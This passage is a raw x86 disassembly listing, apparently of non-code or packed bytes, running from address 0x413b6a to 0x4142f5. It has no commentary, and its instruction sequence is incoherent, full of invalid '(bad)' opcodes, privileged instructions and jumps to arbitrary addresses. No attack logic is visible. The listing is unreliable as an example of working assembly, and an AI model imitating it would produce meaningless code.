  413b6a:	and    DWORD PTR [edi+0x719edcd8],esp
  413b70:	gs jmp 0xffd0:0x568d6cad
  413b78:	dec    ebx
  413b79:	icebp  
  413b7a:	jg     0x413b17
  413b7c:	jmp    0x97ff3d1e
  413b81:	stc    
  413b82:	push   edx
  413b83:	aas    
  413b84:	fiadd  DWORD PTR [edi]
  413b86:	jg     0x413b93
  413b88:	test   al,0x56
  413b8a:	int    0x45
  413b8c:	rcl    DWORD PTR [ecx+ebp*4-0x80],1
  413b90:	cmc    
  413b91:	sahf   
  413b92:	(bad)  
  413b93:	pop    ecx
  413b94:	mov    edi,0xaf1d5a77
  413b99:	stos   DWORD PTR es:[edi],eax
  413b9a:	sub    bh,bh
  413b9c:	or     eax,0xa8124053
  413ba1:	jb     0x413bd7
  413ba3:	and    DWORD PTR [ecx],edx
  413ba5:	aaa    
  413ba6:	or     edx,ecx
  413ba8:	ins    BYTE PTR es:[edi],dx
  413ba9:	mov    ch,0xb5
  413bab:	lock cmp eax,0x7eabe990
  413bb1:	dec    ebx
  413bb2:	sbb    ah,dl
  413bb4:	leave  
  413bb5:	mov    ah,0x21
  413bb7:	shl    DWORD PTR [edx+ecx*2],0x61
  413bbb:	jecxz  0x413c2b
  413bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bbe:	adc    esi,ebx
  413bc0:	test   DWORD PTR [edx+0x3d],edx
  413bc3:	psllq  mm5,QWORD PTR [ebp-0x2b45aabc]
  413bca:	in     al,0x83
  413bcc:	popf   
  413bcd:	mov    dh,0x33
  413bcf:	repnz in eax,dx
  413bd1:	cli    
  413bd2:	repz test al,0x17
  413bd5:	xchg   DWORD PTR [ecx],esp
  413bd7:	cmc    
  413bd8:	xchg   esp,eax
  413bd9:	fisubr DWORD PTR [edx+0x3c]
  413bdc:	stos   BYTE PTR es:[edi],al
  413bdd:	and    esi,ecx
  413bdf:	xlat   BYTE PTR ds:[ebx]
  413be0:	fsubr  st(5),st
  413be2:	fst    QWORD PTR [edx+ecx*1]
  413be5:	or     BYTE PTR [ebx+0x7f],cl
  413be8:	fisub  DWORD PTR [eax]
  413bea:	fcom   DWORD PTR [edx]
  413bec:	jo     0x413baf
  413bee:	xor    BYTE PTR [eax],cl
  413bf0:	bt     esp,esp
  413bf3:	ds xchg edi,eax
  413bf5:	lods   eax,DWORD PTR ds:[esi]
  413bf6:	out    dx,al
  413bf7:	jmp    0x887fad3f
  413bfc:	sbb    al,0xe8
  413bfe:	xchg   DWORD PTR [esi],eax
  413c00:	sub    al,0x3c
  413c02:	imul   ebx,DWORD PTR [edi+0x3],0x283df351
  413c09:	mov    ds:0xc9196489,al
  413c0e:	fwait
  413c0f:	lods   eax,DWORD PTR ds:[esi]
  413c10:	dec    edx
  413c11:	mov    ah,0xbb
  413c13:	sti    
  413c14:	add    DWORD PTR [esi-0x66],ecx
  413c17:	dec    edi
  413c18:	pop    edx
  413c19:	lods   al,BYTE PTR ds:[esi]
  413c1a:	sub    edi,DWORD PTR [edi+eax*1+0x1c3c6611]
  413c21:	mov    eax,ds:0xc1e8f5e7
  413c26:	xlat   BYTE PTR ds:[ebx]
  413c27:	in     al,dx
  413c28:	mov    edi,ds
  413c2a:	sub    al,0xd6
  413c2c:	push   edx
  413c2d:	ret    0x3f23
  413c30:	jmp    0xe7bd:0x2d7ce324
  413c37:	dec    ebp
  413c38:	pop    eax
  413c39:	imul   edx,ebp,0x837e5c5c
  413c3f:	out    0x6d,eax
  413c41:	sahf   
  413c42:	pop    eax
  413c43:	bound  ecx,QWORD PTR [eax+0x7411a4d1]
  413c49:	inc    eax
  413c4a:	jae    0x413c72
  413c4c:	inc    esi
  413c4d:	pop    ecx
  413c4e:	xchg   edx,eax
  413c4f:	and    al,0x15
  413c52:	loopne 0x413c56
  413c54:	imul   ebp,ecx,0x23
  413c57:	cmp    dl,BYTE PTR ds:0x5cb1e55e
  413c5d:	fistp  DWORD PTR [ecx-0x6be15234]
  413c63:	(bad)  
  413c64:	xchg   edi,eax
  413c65:	lds    ecx,FWORD PTR [ebx+0x6d]
  413c68:	inc    esi
  413c69:	inc    ecx
  413c6a:	cmc    
  413c6b:	loop   0x413bf1
  413c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c6e:	div    esi
  413c70:	or     BYTE PTR [eax],ah
  413c72:	ficom  WORD PTR [esi-0x58]
  413c75:	dec    esi
  413c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c77:	cmp    al,0x2a
  413c79:	popf   
  413c7a:	sahf   
  413c7b:	fst    DWORD PTR [eax-0x2b]
  413c7e:	cmp    ch,bh
  413c80:	ret    0x4c7e
  413c83:	fisttp DWORD PTR [ecx+0x11]
  413c86:	imul   ebx,DWORD PTR [edx],0x5c
  413c89:	pop    es
  413c8a:	jmp    0x893b:0x6bd6dd9
  413c91:	fiadd  DWORD PTR [ecx]
  413c93:	inc    ebp
  413c94:	mov    edi,0xa5847bcb
  413c99:	mov    edi,0xccb4b2c4
  413c9e:	pop    ds
  413c9f:	mov    dh,0xc2
  413ca1:	jge    0x413ca4
  413ca3:	fld    QWORD PTR [eax]
  413ca5:	sub    al,BYTE PTR [eax-0x7f]
  413ca8:	jecxz  0x413c73
  413caa:	aad    0x7d
  413cac:	sub    al,0xa
  413cae:	iret   
  413caf:	inc    ebp
  413cb0:	in     al,dx
  413cb1:	xor    cl,al
  413cb3:	sbb    eax,0x6285cfe3
  413cb8:	(bad)  
  413cb9:	stos   DWORD PTR es:[edi],eax
  413cba:	icebp  
  413cbb:	loop   0x413ca2
  413cbd:	mov    edi,0x31eb4293
  413cc2:	scas   eax,DWORD PTR es:[edi]
  413cc3:	xchg   esp,eax
  413cc4:	mov    ebp,0x5a38d8a4
  413cc9:	shr    DWORD PTR [ebx+0x22],1
  413ccc:	aad    0xaa
  413cce:	fisub  DWORD PTR [ecx-0x563f42a1]
  413cd4:	or     ah,dl
  413cd6:	dec    ebp
  413cd7:	fcmovnbe st,st(7)
  413cd9:	pop    edx
  413cda:	in     eax,dx
  413cdb:	pusha  
  413cdc:	dec    ebx
  413cdd:	out    0x8a,eax
  413cdf:	add    DWORD PTR [esi+0x71aff59c],ecx
  413ce5:	js     0x413c85
  413ce7:	int3   
  413ce8:	aaa    
  413ce9:	nop
  413cea:	cmp    esp,DWORD PTR [edx+0x2]
  413ced:	pop    es
  413cee:	jnp    0x413cf7
  413cf0:	aas    
  413cf1:	adc    eax,0x2629541d
  413cf6:	pop    ecx
  413cf7:	inc    edx
  413cf8:	loope  0x413c9f
  413cfa:	test   eax,0x42ab2d9d
  413cff:	aaa    
  413d00:	or     BYTE PTR [edx],0x54
  413d03:	test   eax,0x21b837ca
  413d08:	ds iret 
  413d0a:	sub    edi,DWORD PTR [edi+0x5abc307d]
  413d10:	out    0xb7,al
  413d12:	sub    BYTE PTR [ecx-0x2b3e696a],dl
  413d18:	and    eax,ebp
  413d1a:	push   es
  413d1b:	adc    BYTE PTR [edi],dl
  413d1d:	cwde   
  413d1e:	adc    ebp,esi
  413d20:	and    al,0xa8
  413d22:	mov    dl,0x49
  413d24:	cld    
  413d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d26:	daa    
  413d27:	arpl   WORD PTR [edx],sp
  413d29:	add    DWORD PTR [ebp-0x2d],ebx
  413d2c:	loope  0x413da5
  413d2e:	clc    
  413d2f:	push   es
  413d30:	icebp  
  413d31:	leave  
  413d32:	lock mov eax,DWORD PTR [di+0x76e6]
  413d38:	out    dx,al
  413d39:	lods   eax,DWORD PTR ds:[esi]
  413d3a:	xor    BYTE PTR [ebp+0x5f],0xc6
  413d3e:	dec    esi
  413d3f:	das    
  413d40:	lods   eax,DWORD PTR fs:[esi]
  413d42:	adc    al,0xd
  413d44:	aam    0x2f
  413d46:	sub    al,0x7e
  413d49:	lea    ebx,[esi+ebx*1-0x10b4381d]
  413d50:	das    
  413d51:	loop   0x413db5
  413d53:	mov    edx,0x623cd3b6
  413d58:	add    al,BYTE PTR [ebx+0x79]
  413d5b:	push   ebx
  413d5c:	jns    0x413d19
  413d5e:	pop    eax
  413d5f:	clc    
  413d60:	ds sub eax,0xe2cc06fe
  413d66:	inc    esp
  413d67:	mov    edi,0x83eb80d6
  413d6c:	mov    bl,0xf6
  413d6e:	and    ch,BYTE PTR [ecx-0x56e69da5]
  413d74:	out    dx,al
  413d75:	pusha  
  413d76:	pop    ds
  413d77:	shl    BYTE PTR [ebx+0x45],0x88
  413d7b:	(bad)  
  413d7c:	popf   
  413d7d:	jns    0x413de4
  413d7f:	dec    eax
  413d80:	outs   dx,DWORD PTR ds:[esi]
  413d81:	addr16 inc edx
  413d83:	sub    ah,BYTE PTR [esi-0x34]
  413d86:	test   esi,esi
  413d88:	dec    edi
  413d89:	int    0x3c
  413d8b:	xor    eax,0xed86cb90
  413d90:	mov    esp,edx
  413d92:	ficom  DWORD PTR [edi+0x4cc94cdf]
  413d98:	mov    edx,0xc04752a2
  413d9d:	gs xchg edx,esp
  413da0:	pushf  
  413da1:	mov    esp,DWORD PTR [edx+ecx*4-0x7c]
  413da5:	std    
  413da6:	enter  0x4ba2,0x5f
  413daa:	into   
  413dab:	or     bh,BYTE PTR [edx+0x31]
  413dae:	loop   0x413d33
  413db0:	xor    BYTE PTR [ecx],bl
  413db2:	adc    DWORD PTR [esi+0x32],edx
  413db5:	into   
  413db6:	shl    BYTE PTR [eax],1
  413db8:	add    al,0x4f
  413dba:	arpl   WORD PTR [esi-0x479de9ab],si
  413dc0:	sti    
  413dc1:	jl     0x413dd2
  413dc3:	iret   
  413dc4:	hlt    
  413dc5:	retf   0x864d
  413dc8:	iret   
  413dc9:	fiadd  DWORD PTR [edx+0x6f]
  413dcc:	mov    ebp,0x5dc8edff
  413dd1:	lock sti 
  413dd3:	sbb    al,0x50
  413dd5:	aas    
  413dd6:	sub    edx,ebx
  413dd8:	and    BYTE PTR [ebx+eiz*2+0x2f],ch
  413ddc:	in     al,dx
  413ddd:	retf   
  413dde:	test   DWORD PTR [esi-0x60],edi
  413de1:	and    eax,0x8443cafc
  413de6:	cmp    DWORD PTR [eax],ebp
  413de8:	push   cs
  413de9:	xchg   edi,eax
  413dea:	mov    ds:0xfb1a466e,eax
  413def:	sbb    ebx,DWORD PTR [ebp-0x37]
  413df2:	jnp    0x413e68
  413df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413df5:	cli    
  413df6:	push   es
  413df7:	out    dx,al
  413df8:	fistp  WORD PTR [ebp-0x77]
  413dfb:	push   ds
  413dfc:	lods   al,BYTE PTR ds:[esi]
  413dfd:	push   ds
  413dfe:	ins    DWORD PTR es:[edi],dx
  413dff:	xchg   esp,eax
  413e00:	out    dx,al
  413e01:	fdivr  DWORD PTR [ecx-0x28]
  413e04:	scas   eax,DWORD PTR es:[edi]
  413e05:	test   al,0x96
  413e07:	mov    edx,edx
  413e09:	fwait
  413e0a:	jns    0x413da8
  413e0c:	icebp  
  413e0d:	(bad)
  413e10:	lods   eax,DWORD PTR ds:[esi]
  413e11:	mov    edi,0x9032c2ba
  413e16:	mul    dl
  413e18:	xchg   esp,eax
  413e19:	ins    BYTE PTR es:[edi],dx
  413e1a:	imul   eax,DWORD PTR [ecx+eax*4+0x33],0xc
  413e1f:	add    DWORD PTR [esi+0x65],0x33f32d4d
  413e26:	loopne 0x413dec
  413e28:	or     eax,DWORD PTR [ecx+ebx*8-0xd4e3e97]
  413e2f:	loopne 0x413e04
  413e31:	daa    
  413e32:	jnp    0x413e34
  413e34:	in     al,0xa5
  413e36:	pop    ebp
  413e37:	ret    
  413e38:	or     BYTE PTR ds:0xe7c08d1d,ah
  413e3e:	xor    ch,BYTE PTR fs:[ecx+ecx*2+0x36]
  413e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e44:	outs   dx,DWORD PTR ds:[esi]
  413e45:	(bad)  
  413e47:	sbb    DWORD PTR [ebp+0x406788cc],edi
  413e4d:	mov    edx,0x869a98a6
  413e52:	cmp    edx,edi
  413e54:	aaa    
  413e55:	sbb    DWORD PTR [edi],eax
  413e57:	daa    
  413e58:	pushfw 
  413e5a:	inc    edi
  413e5b:	data16 shr BYTE PTR [esi],cl
  413e5e:	stos   BYTE PTR es:[edi],al
  413e5f:	dec    edi
  413e60:	and    edi,esp
  413e62:	bound  edx,QWORD PTR [edi+0x2c]
  413e65:	imul   edi,DWORD PTR [esi],0x6e
  413e68:	out    0xfc,al
  413e6a:	inc    edx
  413e6b:	cmp    cl,bh
  413e6d:	and    BYTE PTR [esi],bl
  413e6f:	xchg   ecx,eax
  413e70:	sub    DWORD PTR [ebx+0x11],edx
  413e73:	shr    DWORD PTR [eax],0xe2
  413e76:	mov    ch,0x0
  413e78:	jp     0x413e3b
  413e7a:	jecxz  0x413ece
  413e7c:	pop    ebp
  413e7d:	mov    dh,BYTE PTR [ebx-0xb660aa3]
  413e83:	es out 0x12,al
  413e86:	fdivrp st(7),st
  413e88:	push   esp
  413e89:	mov    ds:0x405c00fd,al
  413e8e:	or     al,0x73
  413e90:	int3   
  413e91:	repz mov edi,0xa33d6fc5
  413e97:	and    BYTE PTR [eax],al
  413e99:	cmp    al,dh
  413e9b:	inc    esi
  413e9c:	call   0x8d9:0x8ce74e54
  413ea3:	daa    
  413ea4:	and    al,0xc1
  413ea6:	loope  0x413e4c
  413ea8:	ja     0x413e69
  413eaa:	das    
  413eab:	arpl   bx,di
  413ead:	inc    ebx
  413eae:	dec    esp
  413eaf:	push   si
  413eb1:	mov    DWORD PTR [ebx-0x5c7c869b],ebp
  413eb7:	jge    0x413ebb
  413eb9:	loop   0x413e9a
  413ebb:	pop    es
  413ebc:	sub    eax,0xcca39ebe
  413ec1:	adc    DWORD PTR [edi-0x54],eax
  413ec4:	and    eax,0xb34a4e4b
  413ec9:	(bad)  [edi+0x3c05fe41]
  413ecf:	xchg   BYTE PTR [edi+edi*4+0x65c42109],bh
  413ed6:	xor    BYTE PTR [edx-0x12fe65ca],al
  413edc:	adc    al,0x38
  413ede:	jb     0x73b10887
  413ee4:	bound  edi,QWORD PTR [ebx+edi*4+0x84629f6]
  413eeb:	sub    eax,0x14863200
  413ef0:	rcl    ecx,1
  413ef2:	lock retf 
  413ef4:	xchg   ebx,eax
  413ef5:	mov    ah,0xdf
  413ef7:	std    
  413ef8:	mov    ecx,0x3a35d9d9
  413efd:	adc    eax,0x23b3438b
  413f02:	popa   
  413f03:	mov    al,0x7b
  413f05:	sar    BYTE PTR [ebp-0x47],0xd
  413f09:	icebp  
  413f0a:	pop    eax
  413f0b:	ror    DWORD PTR [ebx-0x15dba47f],cl
  413f11:	xchg   ecx,eax
  413f12:	fs fwait
  413f14:	outs   dx,DWORD PTR ds:[esi]
  413f15:	adc    edx,DWORD PTR [edi]
  413f17:	add    DWORD PTR [esi-0x5c4aef68],0xffffffeb
  413f1e:	je     0x413f93
  413f20:	jae    0x413ebc
  413f22:	popa   
  413f23:	push   esp
  413f24:	daa    
  413f25:	iret   
  413f26:	sahf   
  413f27:	xrelease xchg BYTE PTR [edx],bh
  413f2a:	jmp    0x413f26
  413f2c:	std    
  413f2d:	jne    0x413fab
  413f2f:	out    0xa1,eax
  413f31:	outs   dx,DWORD PTR ds:[esi]
  413f32:	jmp    0x98ce:0x75803724
  413f39:	test   al,0x7d
  413f3b:	loop   0x413f2f
  413f3d:	dec    edi
  413f3e:	aad    0xd6
  413f40:	das    
  413f41:	popa   
  413f42:	add    eax,0x9b2862b
  413f47:	pushf  
  413f48:	sbb    eax,0x2d7d675f
  413f4d:	inc    esi
  413f4e:	in     eax,0xed
  413f50:	leave  
  413f51:	xor    DWORD PTR [edi],esp
  413f53:	jp     0x413faa
  413f55:	mov    ch,0x2f
  413f57:	bound  edi,QWORD PTR [ebp*4+0x617cb63]
  413f5e:	pusha  
  413f5f:	xor    edi,DWORD PTR [eax+esi*8+0x7f18a11d]
  413f66:	fsub   st(7),st
  413f68:	pop    ss
  413f69:	and    dl,BYTE PTR [edx+ebp*8+0x6ff5b93e]
  413f70:	push   edi
  413f71:	inc    esp
  413f72:	test   al,0x14
  413f74:	imul   eax,esp,0x3a9e78f6
  413f7a:	sub    BYTE PTR ds:0x11a7cb59,0x13
  413f81:	jmp    0xa5bc:0xb92c5858
  413f88:	push   esi
  413f89:	and    al,bh
  413f8b:	dec    eax
  413f8c:	cmp    al,0xc5
  413f8e:	adc    DWORD PTR [ebx+0x7e],edx
  413f91:	icebp  
  413f92:	mov    edx,0xf886dd26
  413f97:	imul   esp,eax,0xffffffd8
  413f9a:	fsubr  DWORD PTR [ebp+eax*4+0x4]
  413f9e:	mov    eax,0x1cb8718c
  413fa3:	test   BYTE PTR [ebp+0xc],cl
  413fa6:	cmp    DWORD PTR [eax+0x70],ebx
  413fa9:	es jge 0x41400d
  413fac:	jb     0x413feb
  413fae:	jae    0x413f98
  413fb0:	sub    DWORD PTR [ebp-0x785cac2],0x35cf9e88
  413fba:	sub    al,0x48
  413fbc:	mov    ebx,0x7b4e5aab
  413fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fc2:	jmp    0x413f81
  413fc4:	jo     0x413f72
  413fc6:	mov    BYTE PTR [eax-0x72],0x4f
  413fca:	ins    BYTE PTR es:[edi],dx
  413fcb:	repz push cs
  413fcd:	arpl   WORD PTR [edx+edi*2+0x3e],dx
  413fd1:	inc    esi
  413fd2:	push   ecx
  413fd3:	mov    DWORD PTR [eax],ebx
  413fd5:	sahf   
  413fd6:	xlat   BYTE PTR ds:[ebx]
  413fd7:	repnz (bad) 
  413fd9:	push   esi
  413fda:	clc    
  413fdb:	(bad)  
  413fdc:	outs   dx,DWORD PTR ds:[esi]
  413fdd:	sbb    al,0x17
  413fdf:	add    eax,0x6f84cd70
  413fe4:	inc    edx
  413fe5:	dec    ecx
  413fe6:	bound  ebp,QWORD PTR [esp+edx*8-0x3b1d3fd7]
  413fed:	and    eax,0x33362d8
  413ff2:	push   ebp
  413ff3:	ret    0xab75
  413ff6:	lods   al,BYTE PTR ds:[esi]
  413ff7:	sti    
  413ff8:	pop    ebp
  413ff9:	mul    DWORD PTR [edx]
  413ffb:	wrmsr  
  413ffd:	or     al,0x11
  413fff:	adc    DWORD PTR [edi],0x2d8f3c84
  414005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414006:	sbb    edx,DWORD PTR [edi]
  414008:	jno    0x413ffd
  41400a:	and    ah,BYTE PTR [edi+eax*4]
  41400d:	xchg   ecx,eax
  41400e:	jle    0x41403b
  414010:	arpl   bp,cx
  414012:	dec    ebx
  414013:	fisttp DWORD PTR [edx*4+0x5171d075]
  41401a:	lea    ecx,[edx+0x602a81b0]
  414020:	icebp  
  414021:	shl    DWORD PTR [esi-0x3e0eb1c9],1
  414027:	jg     0x414099
  414029:	mov    bl,0x62
  41402b:	daa    
  41402c:	push   cs
  41402d:	(bad)  
  41402e:	out    0x42,eax
  414030:	pop    esp
  414031:	xor    al,0xe1
  414033:	push   esi
  414034:	lods   eax,DWORD PTR ds:[esi]
  414035:	mov    dl,0xd3
  414037:	pop    eax
  414038:	inc    esp
  414039:	cmp    BYTE PTR [esi],cl
  41403b:	shl    eax,1
  41403d:	jns    0x413ff3
  41403f:	int3   
  414040:	mov    bl,0x2b
  414042:	jecxz  0x41400d
  414044:	sub    eax,0xcd4238cf
  414049:	bound  ebx,QWORD PTR [ebx]
  41404b:	int3   
  41404c:	fdivrp st(3),st
  41404e:	adc    DWORD PTR [edx+0x7b],0x72
  414052:	fs es inc edi
  414055:	das    
  414056:	stos   DWORD PTR es:[edi],eax
  414057:	adc    DWORD PTR ds:0x38c4cff3,0xffffffa4
  41405e:	pusha  
  41405f:	cdq    
  414060:	sub    BYTE PTR [eax+0x2a674781],al
  414066:	clc    
  414067:	mov    ebx,0xc228cc30
  41406c:	mov    bl,dl
  41406e:	mov    dl,0xa7
  414070:	jmp    0x414063
  414072:	adc    eax,0x113460cf
  414077:	xchg   esi,eax
  414078:	push   cs
  414079:	or     BYTE PTR [eax+0x2a],dl
  41407c:	xor    BYTE PTR [eax],ch
  41407e:	cld    
  41407f:	push   esi
  414081:	loope  0x414037
  414083:	cmp    ebp,DWORD PTR [ebx+0x36]
  414086:	push   ebx
  414087:	xor    ah,cl
  414089:	inc    esi
  41408a:	ins    BYTE PTR es:[edi],dx
  41408b:	add    DWORD PTR [esi-0x336d5695],edx
  414091:	jno    0x414025
  414093:	push   0xd5908e5
  414098:	jo     0x41404a
  41409a:	pop    edx
  41409b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41409c:	xor    DWORD PTR [esi+edx*2],ebp
  41409f:	fidiv  WORD PTR [ecx+edx*4]
  4140a2:	and    BYTE PTR [eax],bl
  4140a4:	adc    DWORD PTR [esi-0x57],ecx
  4140a7:	cmp    BYTE PTR [edi+0x118a8e83],ah
  4140ad:	sub    DWORD PTR [eax+0x5f1c43a6],ebp
  4140b3:	jmp    0x4140bb
  4140b5:	jb     0x414119
  4140b7:	loopne 0x41408b
  4140b9:	pop    ss
  4140ba:	push   edi
  4140bb:	mov    esi,0x5284d6ec
  4140c0:	push   edi
  4140c1:	pop    esi
  4140c2:	lods   al,BYTE PTR ds:[esi]
  4140c3:	jg     0x4140c3
  4140c5:	repnz cmp dh,BYTE PTR [ebx-0x7c985b2c]
  4140cc:	test   al,0x0
  4140ce:	or     eax,0x729912f
  4140d3:	not    DWORD PTR ds:0xe143557e
  4140d9:	jb     0x414113
  4140db:	popf   
  4140dc:	jmp    FWORD PTR [edx]
  4140de:	mov    ah,0x32
  4140e0:	xchg   ebp,eax
  4140e1:	push   0x23
  4140e3:	mov    ds:0xe6bc9ca7,al
  4140e8:	(bad)  
  4140e9:	repnz cmp DWORD PTR [edx-0x6b],eax
  4140ed:	fidiv  WORD PTR [edx-0x4c991314]
  4140f3:	pusha  
  4140f4:	test   ebp,ecx
  4140f6:	aad    0x8
  4140f8:	jb     0x4140f0
  4140fa:	mov    eax,0xbab1b1fc
  4140ff:	fcmovbe st,st(5)
  414101:	ret    
  414102:	stc    
  414103:	mov    ebx,0x425a6e54
  414108:	pop    eax
  414109:	in     eax,0x88
  41410b:	jns    0x41418c
  41410d:	(bad)  
  41410e:	mov    al,ds:0x8ea4496f
  414113:	repz mov ebx,0xf9b19000
  414119:	out    0xed,eax
  41411b:	sub    eax,DWORD PTR ds:0xc93cbb07
  414121:	ret    0xe07d
  414124:	xor    BYTE PTR [esi+0x6],0xdb
  414128:	imul   ebx,DWORD PTR [eax-0x7b],0xbaa30269
  41412f:	xlat   BYTE PTR ds:[ebx]
  414130:	retf   0xaf0f
  414133:	(bad)  
  414134:	pop    ebp
  414135:	cli    
  414136:	adc    ch,BYTE PTR [ecx+0x13cf829f]
  41413c:	jb     0x414183
  41413e:	dec    ebx
  41413f:	xor    DWORD PTR [edi],ebp
  414141:	inc    esi
  414142:	test   DWORD PTR [esi],0xe4bdd2e9
  414148:	int    0xf1
  41414a:	adc    dh,bh
  41414c:	and    eax,0x15947d73
  414151:	inc    edi
  414152:	hlt    
  414153:	xchg   esi,eax
  414154:	(bad)  
  414156:	jne    0x414128
  414158:	xchg   esp,eax
  414159:	sub    dh,BYTE PTR [esp+ebp*4]
  41415c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41415d:	std    
  41415e:	inc    edi
  41415f:	mov    bh,0x5e
  414161:	jmp    0x9ace8166
  414166:	pop    ds
  414167:	les    ebx,FWORD PTR [eax]
  414169:	and    al,0x3a
  41416b:	sub    bl,dl
  41416d:	pop    ds
  41416e:	(bad)  
  41416f:	pop    esi
  414170:	mov    cl,0xf5
  414172:	mov    DWORD PTR [ebx+0x65],esp
  414175:	jcxz   0x41418b
  414178:	pop    ds
  414179:	dec    edx
  41417a:	cs stos BYTE PTR es:[edi],al
  41417c:	jmp    0x4141f8
  41417e:	into   
  41417f:	jl     0x4141ce
  414181:	test   DWORD PTR [eax+0xb],edx
  414184:	mov    esp,0x77896ff6
  414189:	jmp    0xad2e9e28
  41418e:	in     al,0x3
  414190:	mov    edi,0x4000d47c
  414195:	repz (bad) 
  414197:	cli    
  414198:	outs   dx,BYTE PTR ds:[esi]
  414199:	cmp    DWORD PTR [ecx+0x47a00cb7],0xe13d5099
  4141a3:	pop    ss
  4141a4:	(bad)  
  4141a5:	popf   
  4141a6:	iret   
  4141a7:	pop    ss
  4141a8:	shl    DWORD PTR [ebx+0x38f9d2ee],0x59
  4141af:	push   ss
  4141b0:	in     eax,dx
  4141b1:	cmp    edx,DWORD PTR [edi]
  4141b3:	out    dx,eax
  4141b4:	test   BYTE PTR [edi+0x7aa7e78],al
  4141ba:	push   es
  4141bb:	leave  
  4141bc:	sbb    BYTE PTR [ecx-0x5274319b],dl
  4141c2:	pop    es
  4141c3:	dec    edx
  4141c4:	ins    BYTE PTR es:[edi],dx
  4141c5:	pop    edi
  4141c6:	enter  0xbe85,0x97
  4141ca:	imul   BYTE PTR [esi+0x13]
  4141cd:	push   ds
  4141ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141cf:	sub    al,0x30
  4141d1:	xchg   esi,eax
  4141d2:	pop    ecx
  4141d3:	cld    
  4141d4:	loopne 0x414193
  4141d6:	cdq    
  4141d7:	ror    BYTE PTR [eax-0x1c8fdd29],0xc6
  4141de:	push   edx
  4141df:	jnp    0x4141d6
  4141e1:	fst    QWORD PTR [ebp+ebp*4-0x6d]
  4141e5:	add    eax,0x5df08a4e
  4141ea:	and    al,0xe8
  4141ec:	cwde   
  4141ed:	sbb    BYTE PTR [ecx],ah
  4141ef:	mov    WORD PTR [ebp+0x61bcd26b],ds
  4141f5:	das    
  4141f6:	xor    DWORD PTR [edi],edx
  4141f8:	je     0x414242
  4141fa:	xchg   edx,eax
  4141fb:	and    al,0x69
  4141fd:	cdq    
  4141fe:	out    dx,eax
  4141ff:	add    ebx,DWORD PTR [ebx]
  414201:	fmul   QWORD PTR [edx+0xb0ba31d]
  414207:	loopne 0x4141a0
  414209:	and    al,0x9a
  41420b:	shr    al,0x33
  41420e:	mov    ecx,0x95ecff88
  414213:	push   0x22bd0533
  414218:	lods   eax,DWORD PTR ds:[esi]
  414219:	push   cs
  41421a:	adc    DWORD PTR [ebx+0x6978c522],edx
  414220:	mov    bl,0xba
  414222:	mov    edx,0xe5429082
  414227:	jge    0x414271
  414229:	loopne 0x41420a
  41422b:	cld    
  41422c:	aaa    
  41422d:	lods   eax,DWORD PTR ds:[esi]
  41422e:	inc    esp
  41422f:	mov    ds:0xf6b8a724,eax
  414234:	(bad)  
  414235:	outs   dx,DWORD PTR ds:[esi]
  414236:	sbb    ch,BYTE PTR [esp+edx*2+0x11]
  41423a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41423b:	data16 mov al,BYTE PTR [esi+eax*8-0x17]
  414240:	sub    ebp,edi
  414242:	addr16 xchg ecx,eax
  414244:	adc    BYTE PTR [ecx+esi*1+0x1a],bl
  414248:	pop    edi
  414249:	pop    ebx
  41424a:	ficomp DWORD PTR [eax+ecx*8+0x1e]
  41424e:	sub    ebx,ebp
  414250:	jmp    0x5cae4707
  414255:	stc    
  414256:	sub    dh,al
  414258:	das    
  414259:	mov    ebx,0x812a77e2
  41425e:	inc    edi
  41425f:	pop    edx
  414260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414261:	cmc    
  414262:	xchg   edx,eax
  414263:	mov    edi,0x67727f66
  414268:	(bad)  
  41426a:	or     ch,al
  41426c:	jae    0x41420c
  41426e:	rcl    DWORD PTR [ecx-0x1c],cl
  414271:	jne    0x4142ef
  414273:	addr16 imul dh
  414276:	jne    0x4142f7
  414278:	sbb    DWORD PTR [ebp-0x70],ebp
  41427b:	je     0x414214
  41427d:	push   ecx
  41427e:	rol    dh,0x67
  414281:	cmp    al,0xaf
  414283:	xchg   ecx,eax
  414284:	icebp  
  414285:	lahf   
  414286:	out    dx,eax
  414287:	inc    ebx
  414288:	add    ebp,DWORD PTR [esi-0x446fd88a]
  41428e:	push   ds
  41428f:	cs and eax,0x347bdaf0
  414295:	add    ecx,DWORD PTR [eax]
  414297:	outs   dx,DWORD PTR ds:[esi]
  414298:	ss pop edi
  41429a:	jp     0x414255
  41429c:	or     BYTE PTR [ebp+0x7b],ch
  41429f:	mov    ds:0x937767e1,al
  4142a4:	mov    al,ds:0x5e21ba8a
  4142a9:	mov    ch,0xc7
  4142ab:	in     al,dx
  4142ac:	pop    edx
  4142ad:	mov    al,ds:0xb84db0bf
  4142b2:	sbb    BYTE PTR [ebx],bh
  4142b4:	jns    0x4142aa
  4142b6:	pop    edx
  4142b7:	ret    
  4142b8:	xor    al,0x54
  4142ba:	fwait
  4142bb:	jge    0x414321
  4142bd:	out    dx,eax
  4142be:	jecxz  0x414291
  4142c0:	sbb    eax,0xa4aa6827
  4142c5:	nop
  4142c6:	fsub   st,st(2)
  4142c8:	and    DWORD PTR [esp+ecx*8+0x59756fd9],eax
  4142cf:	stc    
  4142d0:	adc    BYTE PTR [ebp-0x31],bh
  4142d3:	stos   BYTE PTR es:[edi],al
  4142d4:	fiadd  WORD PTR [ebx-0x24c5642a]
  4142da:	daa    
  4142db:	stos   BYTE PTR es:[edi],al
  4142dc:	pop    ebp
  4142dd:	xor    DWORD PTR [ebx],0x43
  4142e0:	cmp    eax,0x31bac213
  4142e5:	hlt    
  4142e6:	xchg   esi,eax
  4142e7:	cmp    eax,0x9623deb
  4142ec:	and    eax,0x18fa476e
  4142f1:	lods   eax,DWORD PTR ds:[esi]
  4142f2:	pop    ss
  4142f3:	clc    
  4142f4:	inc    esp
  4142f5:	inc    ebp
